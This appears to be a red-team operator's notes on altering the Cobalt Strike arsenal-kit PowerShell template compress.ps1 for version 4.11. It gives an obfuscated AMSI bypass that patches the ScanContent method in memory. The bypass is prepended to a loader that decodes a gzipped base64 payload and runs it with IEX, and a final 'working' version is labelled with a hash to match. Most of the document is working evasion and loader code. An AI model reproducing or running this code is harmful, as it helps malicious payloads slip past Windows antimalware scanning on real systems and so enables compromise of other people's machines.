#### `4.11` before changes

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[07Apr2025 22:33:09]-[/home/â€¦/cobaltstrike/arsenal-kit/kits/resource]
â””â”€# sha256sum compress.ps1 
932dec24b3863584b43caf9bb5d0cfbd7ed1969767d3061a7abdc05d3239ed62  compress.ps1   
```

```powershell
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

#### `4.11` after changes
```powershell
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}; [System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1);$thegreatest=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($thegreatest,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

```c
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1);$thegreatest=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($thegreatest,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

this line is getting caught
```bash
;IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($thegreatest,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```
things to try



## No shit working `compress.ps1` as of  `4.11`
- make sure to match the `sha256sum` `e4f60766bc71fefacc039f45c7f60a3eba5b3d4a00fdd241b5626c908aee9747  compress.ps1`
```bash
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}} [System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1);$thegreatest=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($thegreatest,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```